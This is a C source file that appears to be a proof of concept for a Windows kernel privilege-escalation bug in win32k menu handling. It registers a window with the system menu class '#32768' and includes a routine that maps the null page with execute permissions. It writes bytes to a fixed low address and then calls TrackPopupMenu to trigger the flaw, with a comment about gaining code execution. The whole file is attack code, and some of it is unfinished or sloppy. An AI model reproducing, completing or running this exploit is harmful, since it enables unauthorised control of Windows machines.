#include <windows.h>
#include<stdio.h>
#define THIS_CLASSNAME "#32768"
#define ID_ABOUT       2000
#define ID_EXIT        2001
static BOOL g_bModalState = FALSE; //Is messagebox shown


#define NT_SUCCESS(Status)				(((NTSTATUS)(Status)) >= 0)
typedef
NTSTATUS
(NTAPI *NtAllocateVirtualMemory_t)(
	__in     HANDLE ProcessHandle,
	__inout  PVOID *BaseAddress,
	__in     ULONG_PTR ZeroBits,
	__inout  PSIZE_T RegionSize,
	__in     ULONG AllocationType,
	__in     ULONG Protect
);

void AllocNullPage() 
{
   HMODULE h;
   HANDLE hProc;
   PVOID addr;
   ULONG size;
   NTSTATUS st;

   size = 4096;
   addr = (PVOID)1;
   h = LoadLibraryA("ntdll.dll");

  if (!h)
  {
  	exit(1);
  }
  NtAllocateVirtualMemory_t NtAllocateVirtualMemory;

  NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(h, "NtAllocateVirtualMemory");

  if (!NtAllocateVirtualMemory) 
  {
 	exit(1);
  }

  hProc = GetCurrentProcess();

  if (!hProc)
  {
	exit(1);
  }

  st = NtAllocateVirtualMemory(hProc, &addr, 0, &size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

  if (!NT_SUCCESS(st))
  {
	exit(1);
  }
	
}

 BOOL ShowPopupMenu( HWND hWnd, POINT *curpos, int wDefaultItem ) 
 {
   
      //ADD MENU ITEMS.------------------------------------------------------------------
      HMENU hPop = CreatePopupMenu();
      if ( g_bModalState ) { return FALSE; }
      InsertMenu( hPop, 0, MF_BYPOSITION | MF_STRING, ID_ABOUT, "About..." );
      InsertMenu( hPop, 1, MF_BYPOSITION | MF_STRING, ID_EXIT , "Exit" );
      
      //CAN DO WITHOUT STUFF.------------------------------------------------------------
      SetMenuDefaultItem( hPop, ID_ABOUT, FALSE );
      SetFocus          ( hWnd );
      SendMessage       ( hWnd, WM_INITMENUPOPUP, (WPARAM)hPop, 0 );
   

      POINT pt;
      if (!curpos)
	 {
        GetCursorPos( &pt );
        curpos = &pt;
     }

    //AllocNullPage();
    memset((void*)0x00010003,'\x41',8);
    WORD cmd = TrackPopupMenu( hPop, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD | TPM_NONOTIFY, curpos->x, curpos->y, 0, hWnd, NULL );

// Send message to gain code execution :	SendMessage( hWnd, NULL, NULL, 0 );

}

static LRESULT CALLBACK WndProc( HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam ) 
{ 
      return DefWindowProc( hWnd, uMsg, wParam, lParam );
}
   
 int WINAPI WinMain( HINSTANCE hInst, HINSTANCE prev, LPSTR cmdline, int show ) 
 {
        //CHECK IF PREVIOUS ISTANCE IS RUNNING.-----------------------------------------------------
        HWND hPrev = NULL;
        if ( hPrev = FindWindow( THIS_CLASSNAME, TEXT("Title") ) ) {
        MessageBox(NULL, TEXT("Previous instance alredy running!"), TEXT("Warning"), MB_OK );
       	return 0;
}
        
   //REGISTER WINDOW.--------------------------------------------------------------------------
   WNDCLASSEX wclx; 
   memset(&wclx, 0, sizeof(wclx));
   
   wclx.cbSize         = sizeof( wclx );
   wclx.style          = 0;
   wclx.lpfnWndProc    = &WndProc;
   wclx.cbClsExtra     = 0;
   wclx.cbWndExtra     = 0;
   wclx.hInstance      = hInst;
   //wclx.hIcon        = LoadIcon( hInstance, MAKEINTRESOURCE( IDI_TRAYICON ) );
   //wclx.hIconSm      = LoadSmallIcon( hInstance, IDI_TRAYICON );
   wclx.hCursor        = LoadCursor( NULL, IDC_ARROW );
   wclx.hbrBackground  = (HBRUSH)( COLOR_BTNFACE + 1 );   
                                                           
   wclx.lpszMenuName   = NULL;
   wclx.lpszClassName  = THIS_CLASSNAME;
   
   RegisterClassEx( &wclx );

  //CREATE WINDOW.----------------------------------------------------------------------------
  HWND hWnd = CreateWindow( THIS_CLASSNAME, TEXT("Title"), WS_OVERLAPPEDWINDOW | WS_VISIBLE, 100, 100, 250, 150, NULL, NULL, hInst, NULL );
  if ( !hWnd ) 
  {
        MessageBox(NULL, "Can't create window!", TEXT("Warning!"), MB_ICONERROR | MB_OK | MB_TOPMOST);
        return 1;
   }
  ShowPopupMenu(hWnd, NULL, -1 );
   
}
